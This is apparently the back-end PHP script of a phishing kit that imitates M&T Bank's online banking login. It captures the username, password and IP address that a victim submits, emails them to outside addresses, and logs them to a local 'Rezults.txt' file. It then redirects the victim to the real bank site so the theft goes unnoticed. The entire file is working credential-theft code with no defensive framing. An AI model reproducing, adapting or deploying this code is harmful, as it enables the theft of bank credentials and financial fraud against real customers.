<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ mtb.com Info +--------------\n";
$message .= "UserName : 		  ".$_POST['1userId']."\n";
$message .= "Password : 		  ".$_POST['1Passcode']."\n";



$message .= "IP: ".$ip."\n";
$message .= "---------------Created By vi3nas-----------------\n";
$send = "635634093@etlgr.com,784320094@etlgr.com";
$subject = "mtb.com - [ $ip ]";
$headers = "From: mtb.com -<logs@vi3nas.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 

//submit to textfile
$myFile = "../Rezults.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
fwrite($fh, $message);
fclose($fh);

?>
<script>
    window.top.location.href = "https://onlinebanking.mtb.com/";

</script>

